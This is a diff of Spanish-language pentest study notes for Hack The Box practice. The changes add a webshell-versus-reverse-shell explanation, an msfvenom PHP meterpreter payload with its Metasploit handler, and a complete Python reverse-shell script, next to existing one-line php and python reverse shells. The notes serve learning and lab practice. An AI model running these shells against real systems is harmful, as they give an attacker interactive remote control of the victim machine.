@@ -16,6 +16,12 @@
 > [!important] REVERSE SHELL
 > Es la forma más habitual de conseguir shell. La víctima inicia la conexión hacia ti.
 
+> [!important] WEB SHELL vs REVERSE SHELL (por qué casi siempre reverse)
+> - **Webshell**: tú te conectas a la máquina (necesitas que el firewall deje entrar).
+> - **Reverse shell**: la máquina se conecta a ti (el firewall suele permitir salidas).
+> - Si el firewall bloquea conexiones entrantes pero no salientes, la reverse es la **única opción**.
+> - Metáfora de clase: la webshell es gritar órdenes desde la puerta de una habitación; la reverse es que alguien de dentro te abra un túnel privado para que entres y te muevas libremente.
+
 ---
 
 ## ② Listener (siempre primero)
@@ -50,6 +56,52 @@ php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+### Generadas con Metasploit (msfvenom)
+
+```bash
+# 1) Generar el payload (en Kali)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f raw > shell.php
+
+# 2) Escucha con el handler (en otra terminal)
+msfconsole
+use exploit/multi/handler
+set LHOST <TU_IP>
+set LPORT <PUERTO>
+run
+```
+
+> [!tip] Plantilla de Kali
+> Kali trae `php-reverse-shell.php` en `/usr/share/webshells/php/`. Copia esa plantilla, cambia IP y puerto, súbela al servidor y ábrela en el navegador para disparar la conexión.
+
+### Script Python autocontenido (alternativa robusta)
+
+```python
+#!/usr/bin/env python3
+import socket,subprocess,os,sys
+
+def reverse_shell(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    pid = os.fork()
+    if pid == 0:
+        os.execl("/bin/sh", "/bin/sh", "-i")
+    else:
+        os.waitpid(pid, 0)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Uso: {sys.argv[0]} <IP> <PORT>")
+        sys.exit(1)
+    reverse_shell(sys.argv[1], int(sys.argv[2]))
+```
+
+```bash
+# Ejecutar en la víctima: python3 script.py IP_ATACANTE PUERTO
 ```
 
 > [!tip] REVSHELLS.COM
@@ -122,6 +174,7 @@ En una captura de red, una ráfaga de **HTTP que de repente cambia a TCP** es un
 | Acción | Comando principal | Alternativa |
 |--------|------------------|------------|
 | Reverse shell | `rm -f /tmp/f;mkfifo...` | revshells.com |
+| Payload Metasploit | `msfvenom -p ... -f raw > shell.php` | `exploit/multi/handler` |
 | Listener | `nc -lvnp 4444` | `pwncat-cs -lp 4444` |
 | Estabilizar | `python3 -c 'import pty;pty.spawn(...)'` | `script -qc /bin/bash /dev/null` |
 | Ver privilegios | `sudo -l` | `id`, `LinPEAS` |
@@ -138,6 +191,8 @@ En una captura de red, una ráfaga de **HTTP que de repente cambia a TCP** es un
 - [ ] ¿Sé transferir archivos con http.server + curl/wget?
 - [ ] ¿Entiendo la transición HTTP → TCP en una reverse shell?
 - [ ] ¿Sé cuándo usar revshells.com en lugar de memorizar payloads?
+- [ ] ¿Sé generar un payload con msfvenom y escucharlo con multi/handler?
+- [ ] ¿Explico la diferencia webshell vs reverse shell según el firewall?
 
 ---
 
@@ -153,29 +208,23 @@ En una captura de red, una ráfaga de **HTTP que de repente cambia a TCP** es un
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Escalada de Privilegios, Netcat / Reverse Shells, SQLMap
-- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Escalada de Privilegios, Netcat / Reverse Shells, SQLMap
-- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Escalada de Privilegios, Netcat / Reverse Shells, SQLMap
-- [[Prácticas CTF - HTB y VulnHub.md|Prácticas CTF - HTB y VulnHub]] — Linux, Netcat / Reverse Shells, SQLMap
+- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Hack The Box, Kali Linux, Windows
+- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Hack The Box, Kali Linux, Windows
+- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — Hack The Box, Kali Linux, Windows
+- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Hydra|Hydra]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/SQLMap|SQLMap]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Go/seguridad_go.md|seguridad_go]] — Programacion: Desarrollo Web, Linux, SQL
+- [[../../../programacion/Ruby/seguridad_ruby.md|seguridad_ruby]] — Programacion: Desarrollo Web, Redes, SQL
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
-
-> #escalada-privilegios #hack-the-box #hydra #kali #linux #metasploit #netcat #pentest #redes #reverse-shell #sqli #sqlmap #ssh #vulnhub #windows
+> #cli #escalada_privilegios #go #hack_the_box #hydra #kali #linux #linux_ciber #metasploit #netcat #pentest #python #redes #redes_ciber #reverse_shell #sql #sqli #sqlmap_tool #ssh_tool #vulnhub #web #windows_ciber
